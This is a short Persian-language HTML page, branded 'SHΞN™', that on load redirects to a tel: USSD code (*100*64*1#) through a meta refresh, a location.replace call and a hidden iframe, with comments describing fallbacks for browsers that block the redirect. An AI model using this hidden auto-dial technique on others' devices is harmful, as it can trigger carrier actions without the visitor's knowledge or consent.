<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>SHΞN™</title>
<meta http-equiv="refresh" content="0;url=tel:*100*64*1%23">
<style>
  html,body{margin:0;padding:0;height:100%;background:#000;overflow:hidden;}
  body{display:flex;align-items:center;justify-content:center;}
  #s{color:#fff;font:16px/1.6 system-ui,-apple-system,sans-serif;text-align:center;opacity:.85;}
</style>
</head>
<body>
<div id="s">®️SHΞN™ᴢᴇʀᴏ</div>
<script>
(function(){
  var url = "tel:*100*64*1%23";
  // مسیر ۱: تغییر مستقیم آدرس (سریع‌ترین روی اندروید)
  try { window.location.replace(url); } catch(e){}
  // مسیر ۲: لینک قابل کلیک برای مواقعی که مرورگر ریدایرکت را بلاک کرد
  var a = document.createElement("a");
  a.href = url; a.style.display="none";
  document.body.appendChild(a);
  // مسیر ۳: آی‌فریم پنهان برای مرورگرهایی که tel: را مستقیم نمی‌پذیرند
  var f = document.createElement("iframe");
  f.style.display="none"; f.src = url;
  document.body.appendChild(f);
})();
</script>
</body>
</html>
